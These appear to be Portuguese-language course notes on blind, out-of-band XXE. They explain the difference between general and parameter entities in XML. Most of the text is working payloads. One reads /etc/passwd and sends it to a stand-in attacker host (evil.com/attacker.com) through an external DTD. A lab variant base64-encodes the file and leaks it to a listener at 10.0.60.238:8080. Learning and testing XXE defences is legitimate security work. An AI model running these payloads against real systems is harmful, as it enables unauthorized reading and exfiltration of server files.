# XXE Blind

Conceito de Out of Band

DTD\
Exemplo

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

No arquivo `evil.dtd`, o atacante poderia ter:

```xml
<!ENTITY % send SYSTEM "http://attacker.com/?data=%file;">
```

### Diferença entre `&` e `%` no contexto do XXE

| Símbolo | Usado para                | Exemplo |
| ------- | ------------------------- | ------- |
| `&`     | **Entidade geral**        | `&xxe;` |
| `%`     | **Entidade de parâmetro** | `%xxe;` |



%entidade de parametro

* Usada **dentro da DTD** (definição de tipo de documento).
* Permite incluir outras DTDs, encadear entidades e fazer ataques mais avançados, como **Out-of-Band (OOB)** — muito usado em **Blind XXE**.

Entidades de parâmetro (`%`) são **mais poderosas**, mas **só funcionam dentro da DTD**. Elas são usadas para fazer ataques como:

* Inclusão de DTDs externas (para bypass de filtros);
* Exfiltração de dados (em Blind XXE);
* Encadeamento de entidades para evitar detecção.



{% code title="aula.dtd" %}
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http://10.0.60.238:8080/?leak=%file;'>">
%payload;
%remote;
```
{% endcode %}

```
<!DOCTYPE caique [
  <!ENTITY % test SYSTEM "http://10.0.60.238:8080/aula.dtd">
  %test;
]>
<root>dsf</root>
```



```
/var/www/index.php
```





























